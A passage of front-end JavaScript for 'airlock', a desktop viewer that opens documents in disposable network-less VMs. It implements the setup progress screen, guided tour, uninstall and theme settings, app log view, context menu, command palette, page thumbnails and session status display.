  finish(ok, message) {
    this.finished = ok ? "ok" : "bad";
    this.tEnd = Date.now();
    if (ok) this.frac = 1;
    $("forge").classList.add(ok ? "ok" : "bad");
    const update = this.mode === "update";
    $("forge-title").textContent = ok ? (update ? "Updated · all checks passed" : "The secure viewer is ready") : (update ? "Update stopped" : "The build stopped");
    $("forge-what").textContent = ok ? `${update ? "Updated" : "Built"} and checked in ${fmtTime((Date.now() - this.t0) / 1000)}` : message;
    $("forge-why").textContent = ok ? (update ? "Documents you open from now on use the updated viewer." : "You can open documents now.")
      : (update ? "The current version is still in place and keeps working. The live output below shows what failed." : "Nothing on your computer was changed. Check the live output below, then try again.");
    this.print(ok ? "✓ done" : `✕ ${message}`, ok ? "ok" : "err");
    this.render();
  },
};

$("setup-build").onclick = async () => {
  const b = $("setup-build");
  b.disabled = true;
  $("setup").append($("forge"));
  $("forge").hidden = false;
  $("setup-list").hidden = true;
  $("setup").classList.add("building");
  forge.reset();
  status("Building the secure viewer: you can leave this open");
  const tick = setInterval(() => forge.render(), 500);
  const off = await window.__TAURI__.event.listen("setup-progress", (ev) => forge.line(ev.payload));
  let ok = true;
  try { await invoke("setup_build"); status("airlock is ready"); }
  catch (e) { ok = false; status(String(e), true); forge.finish(false, String(e)); }
  off();
  clearInterval(tick);
  b.disabled = false;
  if (ok) {
    forge.finish(true);
    // Let the finished bar be seen before the start page replaces it.
    await new Promise((r) => setTimeout(r, 2500));
  }
  $("setup-list").hidden = false;
  $("setup").classList.remove("building");
  if (ok) $("forge").hidden = true;
  checkSetup();
};
const setupReady = checkSetup();

invoke("initial_path").then(async (p) => {
  await pixelsReady;
  await sheetsReady;
  // Not set up yet: the setup screen stays; the file waits for the next start.
  if (!(await setupReady) && p) { status("Set up airlock first, then open the file again", true); return; }
  if (!p) return runDemo();
  await openWith(invoke("open_path", { path: p }), p.split(/[\\/]/).pop());
  runDemo();
});

// ---------------------------------------------------------------- guided tour
// A spotlight glides over each control while a glass card explains what it
// does and how it works. Runs once on first start; the ? button replays it.

const TOUR = [
  { target: null, kicker: "Welcome", title: "Open anything. Risk nothing.",
    text: "airlock opens every PDF and Office file inside its own throwaway virtual machine, a tiny separate computer with no network.",
    how: "Your computer never reads the file itself. It only receives pictures of the pages and cleaned-up text. Close the document and the whole VM is destroyed." },
  { target: "appbtn", kicker: "Menu", title: "The airlock menu",
    text: "Click the airlock logo for: New window, Check files automatically (on by default), Pixels only (no text leaves the VM, for files you really distrust), Updates (a dot on the logo means one is ready), Settings & about, the guided tour, and closing.",
    how: "Settings & about is where you pick the colours and background, see every version, read the app log (VMs that stopped, attacks the tripwire blocked, updates, errors) and, for the AppImage, uninstall airlock." },
  { target: "open", kicker: "Open", title: "Open a document",
    text: "Pick files here, press Ctrl+O, or drag them onto the window.",
    how: "Each document gets a brand-new VM that boots in about a second. Open several at once and each gets its own window and VM, so documents never share anything." },
  { target: "seal", kicker: "Status", title: "The seal",
    text: "Green means the document is sealed in its VM, with no network card at all.",
    how: "If the VM ever stops, the seal turns grey and airlock offers to reopen the document in a fresh one." },
  { target: "searchbox", kicker: "Find", title: "Search inside the VM",
    text: "Type to find words. Enter and Shift+Enter jump between matches.",
    how: "The search runs inside the VM. Only the positions of the matches come back as numbers, and airlock draws the highlights itself." },
  { target: "zoombox", kicker: "View", title: "Zoom",
    text: "Zoom in and out, or Fit to match the window width. The + and − keys and Ctrl + scroll wheel work too.",
    how: "The VM redraws each page sharply at the new size: no blurry scaling." },
  { target: "textbtn", kicker: "Read", title: "Document text",
    text: "Shows the document's text, page by page, scrolling together with the pages. You can also select and copy text straight from the page.",
    how: "The text is strictly cleaned before it leaves the VM: only normal visible characters, nothing hidden or invisible." },
  { target: "savewrap", kicker: "Keep", title: "Save a safe copy, or print",
    text: "Safe PDF copy (Ctrl+S) writes a new PDF made only of the page pictures. Print (Ctrl+P) prints them.",
    how: "Nothing from the original survives in the copy (no scripts, links, fonts or attachments), so it is safe to keep, share or open anywhere." },
  { target: "check", kicker: "Investigate", title: "The malware check",
    text: "Every file you open is checked automatically; this badge shows the result. Click it for the full report, or to start a check when automatic checks are off.",
    how: "The file runs in a second VM wired to a fake internet, then that VM's disk is inspected from a third one. The report explains every finding in plain words, with the technical evidence underneath and a log of each step." },
  { target: "appbtn", kicker: "That's it", title: "You're ready",
    text: "Replay this tour anytime from the airlock menu. Side panels can be widened by dragging their left edge. Right-click anywhere for a new window, Close this window (Ctrl+W) or Exit airlock, which closes every document (Ctrl+Q).",
    how: "Tip: when the badge says Suspicious or Likely malicious, read the report before you trust the file." },
];

const tour = { i: 0, revealed: [], onKey: null };

function tourPlace() {
  const step = TOUR[tour.i];
  const spot = $("tour-spot"), card = $("tour-card");
  const target = step.target && $(step.target);
  const r = target && !target.hidden ? target.getBoundingClientRect() : null;
  const vw = window.innerWidth, vh = window.innerHeight;
  if (r && r.width) {
    const pad = 6;
    Object.assign(spot.style, { left: `${r.left - pad}px`, top: `${r.top - pad}px`, width: `${r.width + pad * 2}px`, height: `${r.height + pad * 2}px` });
    spot.classList.remove("center");
  } else {
    Object.assign(spot.style, { left: `${vw / 2}px`, top: `${vh / 2}px`, width: "0px", height: "0px" });
    spot.classList.add("center");
  }
  // The card sits below the target (or above it if there is no room), kept on screen.
  const cw = Math.min(380, vw - 32), ch = card.offsetHeight || 260;
  let left, top;
  if (r && r.width) {
    left = Math.min(Math.max(16, r.left + r.width / 2 - cw / 2), vw - cw - 16);
    top = r.bottom + 18 + ch < vh ? r.bottom + 18 : Math.max(16, r.top - ch - 18);
  } else {
    left = (vw - cw) / 2;
    top = Math.max(16, (vh - ch) / 2);
  }
  Object.assign(card.style, { left: `${left}px`, top: `${top}px`, width: `${cw}px` });
}

function tourShow(i) {
  tour.i = Math.max(0, Math.min(TOUR.length - 1, i));
  const step = TOUR[tour.i];
  const card = $("tour-card");
  card.classList.remove("enter");
  void card.offsetWidth; // restart the entrance animation
  card.classList.add("enter");
  $("tour-step").textContent = `${String(tour.i + 1).padStart(2, "0")} / ${String(TOUR.length).padStart(2, "0")}`;
  $("tour-fill").style.width = `${((tour.i + 1) / TOUR.length) * 100}%`;
  $("tour-kicker").textContent = step.kicker;
  $("tour-title").textContent = step.title;
  $("tour-text").textContent = step.text;
  $("tour-how").textContent = step.how;
  $("tour-back").disabled = tour.i === 0;
  $("tour-next").textContent = tour.i === TOUR.length - 1 ? "Start using airlock" : "Next";
  tourPlace();
  // Placement uses the card's height, which the new text may have changed.
  requestAnimationFrame(tourPlace);
}

function startTour() {
  closePanel();
  toggleSaveMenu(false);
  // Show the whole toolbar, as it looks with a document open; put it back afterwards.
  tour.revealed = ["doc", "searchbox", "zoombox", "textbtn", "savewrap", "check"].filter((id) => $(id).hidden);
  for (const id of tour.revealed) $(id).hidden = false;
  if (tour.revealed.includes("check")) { tour.checkWas = $("check").className; $("check").className = "check clean"; $("check").querySelector(".label").textContent = "No threats found"; }
  if (!$("docname").textContent) { $("docname").textContent = "your-document.pdf"; tour.placeholder = true; }
  document.body.classList.add("touring");
  $("tour").hidden = false;
  requestAnimationFrame(() => $("tour").classList.add("on"));
  tourShow(0);
  tour.onKey = (e) => {
    if (e.key === "ArrowRight" || e.key === "Enter") { e.preventDefault(); tour.i === TOUR.length - 1 ? endTour() : tourShow(tour.i + 1); }
    else if (e.key === "ArrowLeft") { e.preventDefault(); tourShow(tour.i - 1); }
    else if (e.key === "Escape") { e.preventDefault(); endTour(); }
    e.stopImmediatePropagation();
  };
  document.addEventListener("keydown", tour.onKey, true);
  window.addEventListener("resize", tourPlace);
}

function endTour() {
  try { localStorage.setItem("airlock.tourDone", "1"); } catch {}
  document.removeEventListener("keydown", tour.onKey, true);
  window.removeEventListener("resize", tourPlace);
  $("tour").classList.remove("on");
  document.body.classList.remove("touring");
  setTimeout(() => { $("tour").hidden = true; }, 350);
  for (const id of tour.revealed) $(id).hidden = true;
  if (tour.checkWas !== undefined) { tour.checkWas = undefined; showCheck(); }
  if (tour.placeholder) { $("docname").textContent = ""; tour.placeholder = false; }
  if (state.docOpen) fitWidth();
}


// ---------------------------------------------------------------- app menu
// Works on every desktop (with or without a tray): new window, tour, exit.
function toggleAppMenu(open) {
  const m = $("appmenu");
  m.hidden = open === undefined ? !m.hidden : !open;
  $("appbtn").setAttribute("aria-expanded", String(!m.hidden));
}
function quitEverything() {
  status("Closing every airlock window and its VM…");
  invoke("quit_everything");
}
$("appbtn").onclick = (e) => { e.stopPropagation(); toggleAppMenu(); };
$("m-new").onclick = () => { toggleAppMenu(false); invoke("new_window"); };
$("m-tour").onclick = () => { toggleAppMenu(false); startTour(); };
$("m-quit").onclick = quitEverything;

// Uninstall (AppImage only): what goes, two choices, one confirmation.
async function showUninstall() {
  const body = openPanel("Uninstall airlock");
  let info;
  try { info = await invoke("uninstall_info"); } catch (e) { body.replaceChildren(el("p", "note", String(e))); return; }
  const gb = (b) => (b >= 1e9 ? `${(b / 1e9).toFixed(1)} GB` : `${Math.round(b / 1e6)} MB`);
  const list = el("ul", "uninstall-list");
  for (const t of [`The secure viewer and its build files (${gb(info.lib_bytes)}, ${info.lib})`, "The menu entry, icon and \"Open with airlock\"", "airlock's settings and caches"]) list.append(el("li", "", t));
  const opt = (label, hint, checked) => {
    const l = el("label", "check");
    const b = el("input");
    b.type = "checkbox";
    b.checked = checked;
    l.append(b, el("span", "", label));
    if (hint) l.title = hint;
    return [l, b];
  };
  const [sysL, sysB] = opt("Also undo the system settings from setup (asks for your password)", "Removes airlock's device-permission rule and, on Ubuntu, its user-namespace setting. The reserved user-id range stays: other sandboxes may use it.", info.system);
  const [imgL, imgB] = opt(`Also delete the AppImage file (${info.appimage})`, "", true);
  sysL.hidden = !info.system;
  const go = el("button", "danger", "Uninstall");
  go.id = "uninstall-go";
  const cancel = el("button", "", "Cancel");
  cancel.onclick = closePanel;
  const row = el("div", "row");
  row.append(go, cancel);
  body.replaceChildren(el("p", "", "This removes:"), list, sysL, imgL, el("p", "note", "Documents and files you saved are not touched."), row);
  go.onclick = async () => {
    go.disabled = cancel.disabled = true;
    go.textContent = sysB.checked ? "Waiting for your password…" : "Removing…";
    try {
      const done = await invoke("uninstall", { system: sysB.checked, removeAppimage: imgB.checked });
      const ok = el("ul", "uninstall-list done");
      for (const d of done) ok.append(el("li", "", d));
      body.replaceChildren(el("p", "", "airlock was uninstalled:"), ok, el("p", "note", "Closing every airlock window…"));
      setTimeout(() => invoke("quit_everything"), 4000);
    } catch (e) {
      body.append(el("p", "note error", String(e)));
      go.disabled = cancel.disabled = false;
      go.textContent = "Uninstall";
    }
  };
}

// ---------------------------------------------------------------- settings & about
// Accent colours: each sets the theme's light source; status colours (red,
// amber, green verdicts) never change.
const THEMES = [
  ["teal", "Teal", "#2dd4bf", "#22d3ee", "#0f766e"],
  ["ice", "Ice", "#38bdf8", "#a5f3fc", "#0369a1"],
  ["violet", "Violet", "#a78bfa", "#f0abfc", "#6d28d9"],
  ["synth", "Synthwave", "#f472b6", "#c084fc", "#be185d"],
  ["amber", "Amber", "#fbbf24", "#fb923c", "#b45309"],
  ["matrix", "Matrix", "#4ade80", "#a3e635", "#15803d"],
];
// Backgrounds: every surface, line and text shade is mixed from this and the accent.
const BACKGROUNDS = [
  ["abyss", "Abyss", "#070b0e"],
  ["midnight", "Midnight", "#060914"],
  ["graphite", "Graphite", "#0e0f11"],
  ["void", "Void", "#000000"],
  ["nebula", "Nebula", "#0d0716"],
  ["ember", "Ember", "#120a07"],
];
// Custom colours are tamed so any pick works: a background keeps its hue but
// becomes a deep tone (text stays readable); an accent stays bright enough to
// glow, with a neighbouring hue as its second colour.
function hexToHsl(hex) {
  const [r, g, b] = [1, 3, 5].map((i) => parseInt(hex.slice(i, i + 2), 16) / 255);
  const max = Math.max(r, g, b), min = Math.min(r, g, b), l = (max + min) / 2, d = max - min;
  if (!d) return [0, 0, l];
  const s = d / (1 - Math.abs(2 * l - 1));
  const h = max === r ? ((g - b) / d) % 6 : max === g ? (b - r) / d + 2 : (r - g) / d + 4;
  return [(h * 60 + 360) % 360, s, l];
}
function hslToHex(h, s, l) {
  const c = (1 - Math.abs(2 * l - 1)) * s, x = c * (1 - Math.abs(((h / 60) % 2) - 1)), m = l - c / 2;
  const [r, g, b] = h < 60 ? [c, x, 0] : h < 120 ? [x, c, 0] : h < 180 ? [0, c, x] : h < 240 ? [0, x, c] : h < 300 ? [x, 0, c] : [c, 0, x];
  return "#" + [r, g, b].map((v) => Math.round((v + m) * 255).toString(16).padStart(2, "0")).join("");
}
const clamp = (v, lo, hi) => Math.min(hi, Math.max(lo, v));
function tameBackground(hex) {
  const [h, s] = hexToHsl(hex);
  if (s < 0.08) return "#0d0e10";
  return hslToHex(h, clamp(s, 0, 0.45), 0.055);
}
function tameAccent(hex) {
  const [h, s, l] = hexToHsl(hex);
  // White, grey, black: a cool silver, not a guessed hue.
  if (s < 0.08) return ["#d4dde2", "#eef3f6", "#5b6870"];
  return [hslToHex(h, clamp(s, 0.55, 1), clamp(l, 0.55, 0.72)), hslToHex((h + 18) % 360, clamp(s, 0.55, 1), clamp(l + 0.06, 0.6, 0.78)), hslToHex(h, clamp(s, 0.5, 1), 0.3)];
}
const rgb = (hex) => [1, 3, 5].map((i) => parseInt(hex.slice(i, i + 2), 16)).join(", ");
function applyTheme() {
  const id = pref("airlock.theme", "teal");
  let t = THEMES.find((x) => x[0] === id);
  if (!t && /^#[0-9a-f]{6}$/i.test(id)) t = ["custom", "Custom", ...tameAccent(id)];
  t ||= THEMES[0];
  const st = document.documentElement.style;
  st.setProperty("--seal", t[2]);
  st.setProperty("--seal-rgb", rgb(t[2]));
  st.setProperty("--cyan", t[3]);
  st.setProperty("--cyan-rgb", rgb(t[3]));
  st.setProperty("--seal-deep", t[4]);
  const bid = pref("airlock.background", "abyss");
  const bg = BACKGROUNDS.find((x) => x[0] === bid)?.[2] || (/^#[0-9a-f]{6}$/i.test(bid) ? tameBackground(bid) : BACKGROUNDS[0][2]);
  st.setProperty("--base", bg);
}
applyTheme();

async function showSettings() {
  const body = openPanel("Settings & about");
  const sec = (title) => el("h3", "set-head", title);
  // Colour
  const swatches = el("div", "swatches");
  const current = pref("airlock.theme", "teal");
  const pick = (id) => { setPref("airlock.theme", id); applyTheme(); for (const b of swatches.children) b.setAttribute("aria-pressed", String(b.dataset.id === id)); };
  for (const [id, name, a, b] of THEMES) {
    const sw = el("button", "swatch");
    sw.dataset.id = id;
    sw.title = name;
    sw.style.setProperty("--a", a);
    sw.style.setProperty("--b", b);
    sw.append(el("span", "chip"), el("span", "", name));
    sw.setAttribute("aria-pressed", String(current === id));
    sw.onclick = () => pick(id);
    swatches.append(sw);
  }
  const custom = el("label", "swatch custom");
  const input = el("input");
  input.type = "color";
  input.value = /^#/.test(current) ? current : "#2dd4bf";
  custom.dataset.id = "custom";
  custom.setAttribute("aria-pressed", String(/^#/.test(current)));
  custom.append(input, el("span", "", "Custom"));
  input.oninput = () => { setPref("airlock.theme", input.value); applyTheme(); for (const b of swatches.children) b.setAttribute("aria-pressed", String(b === custom)); };
  custom.title = "Any colour: airlock keeps it bright enough to glow";
  swatches.append(custom);

  // Background
  const bgs = el("div", "swatches");
  const curBg = pref("airlock.background", "abyss");
  const pickBg = (id, node) => { setPref("airlock.background", id); applyTheme(); for (const b of bgs.children) b.setAttribute("aria-pressed", String(b === node)); };
  for (const [id, name, c] of BACKGROUNDS) {
    const sw = el("button", "swatch bg");
    sw.title = name;
    sw.style.setProperty("--a", c);
    sw.append(el("span", "chip"), el("span", "", name));
    sw.setAttribute("aria-pressed", String(curBg === id));
    sw.onclick = () => pickBg(id, sw);
    bgs.append(sw);
  }
  const bgCustom = el("label", "swatch custom");
  const bgInput = el("input");
  bgInput.type = "color";
  bgInput.value = /^#/.test(curBg) ? curBg : "#070b0e";
  bgCustom.setAttribute("aria-pressed", String(/^#/.test(curBg)));
  bgCustom.title = "Any colour: airlock uses a deep shade of it, so text stays easy to read";
  bgCustom.append(bgInput, el("span", "", "Custom"));
  bgInput.oninput = () => pickBg(bgInput.value, bgCustom);
  bgs.append(bgCustom);

  // About
  const about = el("dl", "about");
  const logBox = el("div", "console-log tall", "Loading…");
  body.replaceChildren(sec("Accent colour"), swatches, sec("Background"), bgs,
    el("p", "note", "Lines, panels and text shades follow both choices. A custom background becomes a deep shade of the colour you pick, so text always stays readable."), sec("About airlock"), about, sec("App log"),
    el("p", "note", "Everything airlock did on this computer: VMs that stopped, attacks the tripwire blocked, updates, errors. Documents' contents are never logged."), logBox);
  let info = {};
  try { info = await invoke("about_info"); } catch (e) { about.append(el("dd", "", String(e))); }
  const row = (k, v) => { if (v) about.append(el("dt", "", k), el("dd", "", String(v))); };
  row("Version", info.app);
  row("Running from", info.install);
  row("Secure viewer", info.vm_dir);
  if (info.image_built) row("Viewer built", new Date(info.image_built * 1000).toLocaleString());
  row("VM kernel", info.kernel && info.kernel.replace(/^Linux version (\S+).*/, "Linux $1 (hardened)"));
  row("VM engine", info.firecracker);
  if (info.rules) { const [n, c] = info.rules.split(" "); row("Malware rules", `${Number(c).toLocaleString()} signatures (${n})`); }
  if (info.packages?.length) row("Readers in the VM", info.packages.join(", "));
  const lines = info.log || [];
  logBox.replaceChildren(...(lines.length ? lines : ["(empty)"]).map((l) => {
    const m = /^(\d{9,})\s+(pid \d+\s+)?(.*)$/.exec(l);
    const row = el("div", "ln");
    if (m) row.append(el("span", "t", new Date(Number(m[1]) * 1000).toLocaleString()), document.createTextNode(` ${m[3]}`));
    else row.textContent = l;
    if (/attack|tripwire|crash|could not|error|failed/i.test(l)) row.classList.add("warn");
    return row;
  }));
  logBox.scrollTop = logBox.scrollHeight;
  const copy = el("button", "", "Copy log");
  copy.onclick = async () => { try { await navigator.clipboard.writeText(lines.join("\n")); copy.textContent = "Copied"; } catch { copy.textContent = "Could not copy"; } };
  const rowEl = el("div", "row");
  rowEl.append(copy);
  body.append(rowEl);
  // Uninstall (AppImage only)
  try {
    const u = await invoke("uninstall_info");
    if (u.available) {
      const b = el("button", "danger", "Uninstall airlock…");
      b.onclick = showUninstall;
      body.append(sec("Uninstall"), el("p", "note", "Removes the secure viewer, the menu entry and airlock's settings from this computer."), b);
    }
  } catch {}
}
$("m-settings").onclick = () => { toggleAppMenu(false); showSettings(); };
$("m-close").onclick = closeWindow;
function showAutoCheck() { $("m-auto").setAttribute("aria-checked", String(autoCheckOn())); }
$("m-auto").onclick = () => {
  setPref("airlock.autoCheck", autoCheckOn() ? "0" : "1");
  showAutoCheck();
  if (autoCheckOn() && state.docOpen && !check.report && !check.running) startCheck();
  status(autoCheckOn() ? "Files are checked for malware automatically when opened" : "Automatic check off: press Analyze to check a file");
};
showAutoCheck();
function closeWindow() {
  status("Closing this window and its VM…");
  invoke("close_window");
}

// Right-click: airlock's own menu instead of WebKit's (whose Reload would
// throw away the open document). Text boxes keep the native one (paste).
function hideCtx() { $("ctxmenu").hidden = true; }
document.addEventListener("contextmenu", (e) => {
  if (e.target.closest("input, textarea")) return;
  e.preventDefault();
  toggleAppMenu(false);
  const m = $("ctxmenu");
  m.querySelectorAll("[data-doc]").forEach((b) => (b.hidden = !state.docOpen));
  $("c-copy").hidden = !String(getSelection() || "").trim();
  m.hidden = false;
  const x = Math.min(e.clientX, innerWidth - m.offsetWidth - 4), y = Math.min(e.clientY, innerHeight - m.offsetHeight - 4);
  m.style.left = Math.max(4, x) + "px";
  m.style.top = Math.max(4, y) + "px";
});
const ctxActions = {
  "c-copy": () => document.execCommand("copy"),
  "c-zin": () => stepZoom(1),
  "c-zout": () => stepZoom(-1),
  "c-fit": fitWidth,
  "c-safe": saveSafeCopy,
  "c-print": printDocument,
  "c-analyze": () => analyze(),
  "c-new": () => invoke("new_window"),
  "c-close": closeWindow,
  "c-quit": quitEverything,
};
for (const [id, fn] of Object.entries(ctxActions)) $(id).onclick = () => { hideCtx(); fn(); };
document.addEventListener("click", (e) => { if (!$("ctxmenu").contains(e.target)) hideCtx(); });
window.addEventListener("blur", hideCtx);
window.addEventListener("scroll", hideCtx, true);
document.addEventListener("click", (e) => { if (!$("appwrap").contains(e.target)) toggleAppMenu(false); });
document.addEventListener("keydown", (e) => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "q") { e.preventDefault(); quitEverything(); }
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "w") { e.preventDefault(); closeWindow(); }
  if (e.key === "Escape") { toggleAppMenu(false); hideCtx(); }
});
$("tour-next").onclick = () => (tour.i === TOUR.length - 1 ? endTour() : tourShow(tour.i + 1));
$("tour-back").onclick = () => tourShow(tour.i - 1);
$("tour-skip").onclick = endTour;

// First start: the tour, unless a test script is driving the app.
(async () => {
  let done = false;
  try { done = localStorage.getItem("airlock.tourDone") === "1"; } catch {}
  const demo = await invoke("demo_script").catch(() => null);
  if (!done && !demo) setTimeout(startTour, 700);
})();

// ================================================================ pro tools
// Command palette, page thumbnails, live session status, the result badge's
// quick summary, and the "sealing" transition when a document opens.

// ---------------------------------------------------------------- command palette
// Every action by name (Ctrl+K). Typing a number goes to that page.
function paletteCommands() {
  const doc = state.docOpen;
  const c = [
    ["Open a document…", "Ctrl+O", true, openDialog],
    ["Search in the document", "Ctrl+F", doc, () => { $("q").focus(); $("q").select(); }],
    ["Zoom in", "+", doc, () => stepZoom(1)],
    ["Zoom out", "−", doc, () => stepZoom(-1)],
    ["Fit to width", "", doc, fitWidth],
    ["Show page thumbnails", "Ctrl+B", doc && $("thumbs").hidden, () => setThumbs(true)],
    ["Hide page thumbnails", "Ctrl+B", doc && !$("thumbs").hidden, () => setThumbs(false)],
    ["Show the document's text", "", doc && !state.pixelsOnly, showText],
    ["Save a safe PDF copy…", "Ctrl+S", doc, saveSafeCopy],
    ["Print…", "Ctrl+P", doc, printDocument],
    ["Malware report", "", doc, () => showAnalysis()],
    ["Check for malware again", "", doc, () => showAnalysis(undefined, true)],
    ["Save the malware report…", "", doc && !!check.report, saveReport],
    [state.pixelsOnly ? "Turn off Pixels only" : "Turn on Pixels only (no text leaves the VM)", "", true, () => setPixelsOnly(!state.pixelsOnly)],
    [autoCheckOn() ? "Stop checking files automatically" : "Check files automatically", "", true, () => $("m-auto").click()],
    ["Spreadsheets: one page per sheet / pages", "", doc && !$("sheetbtn").hidden, () => $("sheetbtn").click()],
    ["Updates…", "", true, showUpdates],
    ["Settings & about…", "", true, showSettings],
    ["Guided tour", "", true, startTour],
    ["New window", "", true, () => invoke("new_window")],
    ["Close this window", "Ctrl+W", true, closeWindow],
    ["Exit airlock (all windows)", "Ctrl+Q", true, quitEverything],
  ];
  for (const [id, name] of THEMES) c.push([`Accent colour: ${name}`, "", true, () => { setPref("airlock.theme", id); applyTheme(); }]);
  for (const [id, name] of BACKGROUNDS) c.push([`Background: ${name}`, "", true, () => { setPref("airlock.background", id); applyTheme(); }]);
  return c.filter((x) => x[2]);
}

// Letters in order, rewarding word starts and runs: "sv cp" finds "Save a safe PDF copy".
function fuzzy(q, text) {
  const t = text.toLowerCase();
  let score = 0, ti = 0, run = 0;
  for (const ch of q.toLowerCase().replace(/\s+/g, "")) {
    const i = t.indexOf(ch, ti);
    if (i < 0) return -1;
    run = i === ti ? run + 1 : 0;
    score += 1 + run * 2 + (i === 0 || /[\s:(/]/.test(t[i - 1]) ? 4 : 0) - (i - ti) * 0.05;
    ti = i + 1;
  }
  return score;
}

const palette = { items: [], sel: 0 };
function renderPalette() {
  const q = $("pal-q").value.trim();
  let items = [];
  const n = Number(q.replace(/^(:|page\s*|p\s*)/i, ""));
  if (state.docOpen && q && Number.isInteger(n) && n >= 1 && n <= state.pages.length) {
    items.push([`Go to page ${n} of ${state.pages.length}`, "", true, () => gotoPage(n - 1)]);
  }
  const cmds = paletteCommands();
  items.push(...(q ? cmds.map((c) => [c, fuzzy(q, c[0])]).filter(([, s]) => s >= 0).sort((a, b) => b[1] - a[1]).map(([c]) => c) : cmds));
  palette.items = items.slice(0, 12);
  palette.sel = Math.min(palette.sel, Math.max(0, palette.items.length - 1));
  $("pal-list").replaceChildren(...palette.items.map(([label, keys], i) => {
    const li = el("li", i === palette.sel ? "sel" : "");
    li.setAttribute("role", "option");
    li.append(el("span", "", label));
    if (keys) li.append(el("kbd", "", keys));
    li.onmouseenter = () => { palette.sel = i; for (const [k, x] of [...$("pal-list").children].entries()) x.classList.toggle("sel", k === i); };
    li.onclick = () => runPalette(i);
    return li;
  }));
  if (!palette.items.length) $("pal-list").append(el("li", "empty", "No matching command"));
}
function openPalette() {
  toggleAppMenu(false);
  $("palette").hidden = false;
  $("pal-q").value = "";
  palette.sel = 0;
  renderPalette();
  $("pal-q").focus();
}
function closePalette() { $("palette").hidden = true; }
function runPalette(i) {
  const item = palette.items[i];
  closePalette();
  if (item) item[3]();
}
$("pal-q").addEventListener("input", () => { palette.sel = 0; renderPalette(); });
$("pal-q").addEventListener("keydown", (e) => {
  if (e.key === "ArrowDown") { e.preventDefault(); palette.sel = Math.min(palette.items.length - 1, palette.sel + 1); renderPalette(); }
  else if (e.key === "ArrowUp") { e.preventDefault(); palette.sel = Math.max(0, palette.sel - 1); renderPalette(); }
  else if (e.key === "Enter") { e.preventDefault(); runPalette(palette.sel); }
  else if (e.key === "Escape") { e.preventDefault(); closePalette(); }
  e.stopPropagation();
});
$("palette").addEventListener("mousedown", (e) => { if (e.target === $("palette")) closePalette(); });
$("palbtn").onclick = openPalette;
document.addEventListener("keydown", (e) => {
  const mod = e.ctrlKey || e.metaKey;
  if (mod && (e.key.toLowerCase() === "k" || (e.shiftKey && e.key.toLowerCase() === "p"))) { e.preventDefault(); $("palette").hidden ? openPalette() : closePalette(); }
  if (mod && e.key.toLowerCase() === "b" && state.docOpen) { e.preventDefault(); setThumbs($("thumbs").hidden); }
});

function gotoPage(i) {
  const p = state.pages[i];
  if (p) $("viewer").scrollTop = p.el.offsetTop - 12;
}

// ---------------------------------------------------------------- page thumbnails
// Small renders from the same VM, made only when the main pages are idle.
const thumbs = { list: [], observer: null, queue: [], busy: false, current: -1 };
function setThumbs(on) {
  $("thumbs").hidden = !on;
  $("thumbbtn").setAttribute("aria-pressed", String(on));
  setPref("airlock.thumbs", on ? "1" : "0");
  if (on) buildThumbs();
  if (state.fitMode && state.docOpen) fitWidth();
}
function buildThumbs() {
  if (thumbs.list.length === state.pages.length && thumbs.list.length) return;
  if (thumbs.observer) thumbs.observer.disconnect();
  for (const t of thumbs.list) if (t.url) URL.revokeObjectURL(t.url);
  thumbs.queue = [];
  thumbs.observer = new IntersectionObserver((entries) => {
    for (const e of entries) if (e.isIntersecting) queueThumb(Number(e.target.dataset.index));
  }, { root: $("thumbs"), rootMargin: "300px 0px" });
  thumbs.list = state.pages.map((p, i) => {
    const b = el("button", "thumb");
    b.dataset.index = String(i);
    b.title = `Page ${i + 1}`;
    const box = el("div", "frame");
    box.style.aspectRatio = `${p.w} / ${p.h}`;
    const img = el("img");
    img.alt = "";
    box.append(img);
    b.append(box, el("span", "n", String(i + 1)));
    b.onclick = () => gotoPage(i);
    thumbs.observer.observe(b);
    return { el: b, img, url: null, done: false };
  });
  $("thumbs").replaceChildren(...thumbs.list.map((t) => t.el));
  markThumb(true);
}
function queueThumb(i) {
  if (!thumbs.list[i] || thumbs.list[i].done || thumbs.queue.includes(i)) return;
  thumbs.queue.push(i);
  pumpThumbs();
}
async function pumpThumbs() {
  if (thumbs.busy) return;
  thumbs.busy = true;
  try {
    while (thumbs.queue.length && state.docOpen) {
      // The main pages first.
      while (state.rendering) await new Promise((r) => setTimeout(r, 120));
      const i = thumbs.queue.shift();
      const t = thumbs.list[i];
      if (!t || t.done) continue;
      try {
        const buf = await invoke("render_page", { page: i, dpi: 24 });
        t.url = URL.createObjectURL(new Blob([buf], { type: "image/png" }));
        t.img.src = t.url;
        t.done = true;
        t.el.classList.add("ready");
      } catch { break; }
    }
  } finally {
    thumbs.busy = false;
  }
}
function markThumb(scrollIntoView = false) {
  if ($("thumbs").hidden || !thumbs.list.length) return;
  const cur = currentPage();
  if (cur === thumbs.current && !scrollIntoView) return;
  thumbs.list[thumbs.current]?.el.classList.remove("current");
  thumbs.current = cur;
  const t = thumbs.list[cur];
  if (!t) return;
  t.el.classList.add("current");
  const box = $("thumbs"), top = t.el.offsetTop, bottom = top + t.el.offsetHeight;
  if (top < box.scrollTop || bottom > box.scrollTop + box.clientHeight) box.scrollTop = top - box.clientHeight / 3;
}
$("viewer").addEventListener("scroll", () => markThumb(), { passive: true });
$("thumbbtn").onclick = () => setThumbs($("thumbs").hidden);

// ---------------------------------------------------------------- session status
// Facts about the sealed session, live: how long its VM has run, what it
// can reach (nothing), what may leave it.
const session = { t0: 0, stopped: false };
function fmtUp(ms) {
  const s = Math.floor(ms / 1000);
  return s < 3600 ? `${Math.floor(s / 60)}:${String(s % 60).padStart(2, "0")}` : `${Math.floor(s / 3600)}h ${Math.floor((s % 3600) / 60)}m`;
}
function renderTelemetry() {
  const t = $("telemetry");
  t.hidden = !state.docOpen;
  if (!state.docOpen) return;
  const stopped = $("seal").classList.contains("stopped");
  const parts = stopped
    ? [["VM", "destroyed"], ["pages", String(state.pages.length)]]
    : [["VM", `up ${fmtUp(Date.now() - session.t0)}`], ["pages", String(state.pages.length)], ["network", "none"], ["leaves the VM", state.pixelsOnly ? "pixels only" : "pixels + cleaned text"]];
  t.replaceChildren(...parts.map(([k, v], i) => {
    const s = el("span", i === 0 ? (stopped ? "t-item off" : "t-item live") : "t-item");
    s.append(el("b", "", k), document.createTextNode(` ${v}`));
    return s;
  }));
}
setInterval(renderTelemetry, 1000);

// ---------------------------------------------------------------- badge summary
// Hovering the result badge shows the top findings without opening a panel.
let peekTimer = null;
function showPeek() {
